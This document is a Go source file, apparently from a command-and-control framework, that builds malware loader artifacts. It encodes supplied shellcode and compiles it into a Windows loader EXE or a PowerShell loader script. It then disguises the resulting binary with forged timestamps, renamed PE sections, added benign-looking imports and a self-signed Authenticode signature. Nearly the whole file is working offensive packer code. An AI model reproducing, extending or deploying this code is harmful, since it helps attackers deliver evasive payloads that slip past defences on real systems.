package payload

import (
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"os"
	"strings"
)

type BuildArtifactRequest struct {
	TemplateName   string `json:"template_name"`
	OutputType     string `json:"output_type"`
	ShellcodeB64   string `json:"shellcode_b64"`
	RawEXEB64      string `json:"raw_exe_b64"`
	EncodeType     string `json:"encode_type"`
	EncodeKeyHex   string `json:"encode_key_hex"`
	PESectionText  string `json:"pe_section_text"`
	PESectionData  string `json:"pe_section_data"`
	PESectionRdata string `json:"pe_section_rdata"`
	PESectionReloc string `json:"pe_section_reloc"`
	EntryPoint     string `json:"entry_point"`
	Timestamp      string `json:"timestamp"`
	TimestampDate  string `json:"timestamp_date"`
	CertOption     string `json:"cert_option"`
	CertOrg        string `json:"cert_org"`
	ImportDLLs     string `json:"import_dlls"`
	OutputFilename string `json:"output_filename"`
}

func randomHex(n int) string {
	b := make([]byte, n)
	rand.Read(b)
	return hex.EncodeToString(b)
}

// ArtifactValidationError marks a request-level problem (bad enum value,
// malformed payload, unsupported combination). Handlers map it to HTTP 400;
// every other error returned by BuildArtifact is a server-side build failure
// (HTTP 500).
type ArtifactValidationError struct {
	Msg string
}

func (e *ArtifactValidationError) Error() string { return e.Msg }

func artifactValidationError(format string, a ...any) error {
	return &ArtifactValidationError{Msg: fmt.Sprintf(format, a...)}
}

// normalizeEntryPoint maps the operator-facing entry point names to the
// loader's execution techniques. "thread" and "call" are aliases (threaded
// execution); "tls" has no loader implementation and is rejected rather than
// silently ignored.
func normalizeEntryPoint(name string, fallback EntryPointTechnique) (string, error) {
	v := EntryPointTechnique(name)
	if v == "" {
		v = fallback
	}
	switch v {
	case EPDirect, "":
		return "direct", nil
	case EPCall, "thread":
		return "thread", nil
	case EPCallback:
		return "callback", nil
	case EPTLS:
		return "", artifactValidationError("tls entry point is not implemented; choose direct, thread or callback")
	default:
		return "", artifactValidationError("unknown entry point technique %q", name)
	}
}

// BuildArtifact produces a packer artifact from an encoded shellcode blob or
// a raw PE image:
//
//   - exe (and the legacy service_exe alias) builds a real Windows loader
//     executable: the encoded shellcode, decode key and entry technique are
//     compiled in, and the compiled PE then gets the requested timestamp /
//     section-name / benign-import transformations applied to the actual
//     binary.
//   - ps1 renders a PowerShell loader script that decodes and executes the
//     embedded blob.
//   - raw / shellcode return the encoded payload bytes as-is (a raw blob is
//     the meaningful result of those output types).
//   - dll is refused: a Go-built DLL needs a C toolchain (-buildmode=c-shared
//     requires an external linker) which is not assumed to exist on the
//     server; shipping a fake DLL-shaped file would silently fail at load.
func BuildArtifact(req BuildArtifactRequest, dataDir string) ([]byte, string, error) {
	tmpl := DefaultArtifactTemplate(req.TemplateName)

	if req.OutputType != "" {
		tmpl.OutputType = req.OutputType
	}
	if req.PESectionText != "" {
		tmpl.PESections.Text = req.PESectionText
	}
	if req.PESectionData != "" {
		tmpl.PESections.Data = req.PESectionData
	}
	if req.PESectionRdata != "" {
		tmpl.PESections.Rdata = req.PESectionRdata
	}
	if req.PESectionReloc != "" {
		tmpl.PESections.Reloc = req.PESectionReloc
	}
	if req.EntryPoint != "" {
		tmpl.EntryPointTechnique = EntryPointTechnique(req.EntryPoint)
	}
	if req.Timestamp != "" {
		tmpl.Timestamp = TimestampOption(req.Timestamp)
		tmpl.TimestampValue = req.TimestampDate
	}
	if req.CertOption != "" {
		tmpl.CertOption = CertOption(req.CertOption)
		tmpl.CertOrg = req.CertOrg
	}
	if req.EncodeType != "" {
		tmpl.ShellcodeEncode = ShellcodeEncode(req.EncodeType)
	}
	if req.EncodeKeyHex != "" {
		tmpl.EncodeKey = req.EncodeKeyHex
	}
	if req.ImportDLLs != "" {
		tmpl.ImportManipulation = true
		tmpl.BenignImports = strings.Split(req.ImportDLLs, ",")
	}

	// Certificate options: "none" leaves the image unsigned; "self_signed"
	// embeds an Authenticode signature generated with a throwaway self-signed
	// certificate (applied below once payloadData exists). Anything else would
	// silently produce an unsigned binary and is refused.
	switch tmpl.CertOption {
	case "", CertNone:
	case CertSelfSigned:
	default:
		return nil, "", artifactValidationError("certificate option %q is not supported; use \"none\" or \"self_signed\"", tmpl.CertOption)
	}

	entry, err := normalizeEntryPoint(req.EntryPoint, tmpl.EntryPointTechnique)
	if err != nil {
		return nil, "", err
	}

	tmpDir, err := os.MkdirTemp("", "forgec2-pack-*")
	if err != nil {
		return nil, "", fmt.Errorf("temp dir: %w", err)
	}
	defer os.RemoveAll(tmpDir)

	var payloadData []byte
	var encKey []byte

	if req.ShellcodeB64 != "" {
		shellcode, err := base64.StdEncoding.DecodeString(req.ShellcodeB64)
		if err != nil {
			return nil, "", artifactValidationError("shellcode base64: %v", err)
		}
		if len(shellcode) == 0 {
			return nil, "", artifactValidationError("shellcode is empty after base64 decode")
		}
		if req.EncodeKeyHex != "" {
			encKey, err = hex.DecodeString(req.EncodeKeyHex)
			if err != nil {
				return nil, "", artifactValidationError("invalid encode key hex: %v", err)
			}
		}
		if len(encKey) == 0 {
			encKey = []byte(randomHex(8))
		}
		encoded, err := EncodeShellcode(shellcode, tmpl.ShellcodeEncode, encKey)
		if err != nil {
			return nil, "", artifactValidationError("encode: %v", err)
		}
		if len(encoded) == 0 {
			return nil, "", artifactValidationError("encoded shellcode is empty")
		}

		switch tmpl.OutputType {
		case "exe", "service_exe":
			// Build a real loader EXE with the encoded blob, key, decode
			// method and entry technique compiled in.
			payloadData, err = buildLoaderEXE(tmpDir, encoded, encKey, tmpl.ShellcodeEncode, entry)
			if err != nil {
				return nil, "", err
			}
		case "ps1":
			payloadData, err = buildPS1Loader(encoded, encKey, tmpl.ShellcodeEncode)
			if err != nil {
				return nil, "", err
			}
		case "raw", "shellcode", "":
			payloadData = encoded
		case "dll":
			return nil, "", artifactValidationError("dll output is not supported: Go DLL builds require a C toolchain (gcc) which is not available on this server")
		default:
			return nil, "", artifactValidationError("unknown output type %q", tmpl.OutputType)
		}
	} else if req.RawEXEB64 != "" {
		// Raw PE passthrough: the artifact IS the supplied executable. The
		// output type is ignored because nothing can be built from a PE other
		// than the PE itself (packaging it differently belongs to the bundle
		// endpoint).
		payloadData, err = base64.StdEncoding.DecodeString(req.RawEXEB64)
		if err != nil {
			return nil, "", artifactValidationError("exe base64: %v", err)
		}
		if len(payloadData) < 0x40 || payloadData[0] != 'M' || payloadData[1] != 'Z' {
			return nil, "", artifactValidationError("raw_exe_b64 does not decode to a PE image (missing MZ header)")
		}
		// Encode the shellcode field if it was also supplied: the request
		// validator only requires one of the two, but an encode type with a
		// raw exe is meaningless and would silently do nothing.
		if req.EncodeType != "" && req.EncodeType != "none" {
			return nil, "", artifactValidationError("encode_type %q cannot be applied to a raw exe", req.EncodeType)
		}
		tmpl.OutputType = "raw"
	} else {
		return nil, "", artifactValidationError("no payload source provided: set shellcode_b64 or raw_exe_b64 to build an artifact")
	}

	// PE transformations only make sense on a real PE image. They apply to the
	// freshly compiled loader and to raw-exe passthroughs; encoded shellcode
	// blobs are not PE images and must be skipped (ApplyTimestamp and
	// ApplyPESectionNames would no-op, AddBenignImports would error).
	if len(payloadData) >= 2 && payloadData[0] == 'M' && payloadData[1] == 'Z' {
		ts, err := GenerateTimestamp(tmpl.Timestamp, tmpl.TimestampValue)
		if err != nil {
			return nil, "", artifactValidationError("%s", err)
		}
		ApplyTimestamp(payloadData, ts)
		if tmpl.PESections != (PESectionConfig{}) {
			ApplyPESectionNames(payloadData, tmpl.PESections)
		}
		if tmpl.ImportManipulation && len(tmpl.BenignImports) > 0 {
			patched, err := AddBenignImports(payloadData, tmpl.BenignImports)
			if err != nil {
				return nil, "", artifactValidationError("%s", err)
			}
			payloadData = patched
		}
		// Authenticode signing runs last: the signature covers every byte of
		// the final image (modulo the checksum/security-directory fields the
		// digest zeroes), so any later mutation would invalidate it.
		if tmpl.CertOption == CertSelfSigned {
			signed, err := SignPESelfSigned(payloadData, tmpl.CertOrg)
			if err != nil {
				return nil, "", artifactValidationError("self-signed signing: %v", err)
			}
			payloadData = signed
		}
	} else if tmpl.CertOption == CertSelfSigned {
		return nil, "", artifactValidationError("cert_option self_signed requires a PE output type; shellcode blobs cannot carry a certificate table")
	}

	ext := ".bin"
	switch tmpl.OutputType {
	case "exe", "service_exe":
		ext = ".exe"
	case "ps1":
		ext = ".ps1"
	}
	filename := req.OutputFilename
	if filename == "" {
		filename = "artifact" + ext
	}
	if !strings.HasSuffix(strings.ToLower(filename), ext) {
		filename += ext
	}

	return payloadData, filename, nil
}
